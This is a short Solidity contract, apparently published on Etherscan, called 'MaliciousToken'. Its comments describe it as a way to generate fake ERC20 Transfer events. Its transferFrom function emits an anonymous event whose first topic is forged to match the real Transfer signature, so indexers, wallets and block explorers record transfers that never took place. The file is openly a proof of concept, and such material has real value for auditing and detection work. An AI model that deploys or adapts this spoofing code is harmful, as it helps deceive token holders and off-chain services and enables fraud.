/**
 *Submitted for verification at Etherscan.io on 2023-02-27
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

// This is a malicious token contract that will generated fake ERC20 transfer events
contract MaliciousToken {
    /* leggit ERC20 transfer event. It uses 3 topics
        1. keccak256("Transfer(address,address,uint256)")
        2. from
        3. to

        In this case, the first topic is automatically generated by the compiler
    */
    event Transfer(address indexed from, address indexed to, uint256 amount);
    /* fake ERC20 transfer event that will look like the legit one. It uses 3 topics too
        1. keccak256("Transfer(address,address,uint256)")
        2. from
        3. to

        In this case, the first topic is forged the same way the compiler does it for the legit event
    */
    event FakeTransfer(
        bytes32 indexed fakeSelector,
        address indexed from,
        address indexed to,
        uint256 amount
    ) anonymous;

    function transfer(address to, uint256 amount) external {
        // transfer logic

        emit Transfer(msg.sender, to, amount);
    }

    // faking the transferFrom function signature
    function transferFrom(
        // This param is not used, that's why it's not named
        // I need it to make the function signature leggit in the ERC20 spec
        address,
        address to,
        uint256 amount
    ) external {
        // custom logic

        emit FakeTransfer(Transfer.selector, msg.sender, to, amount);
    }
}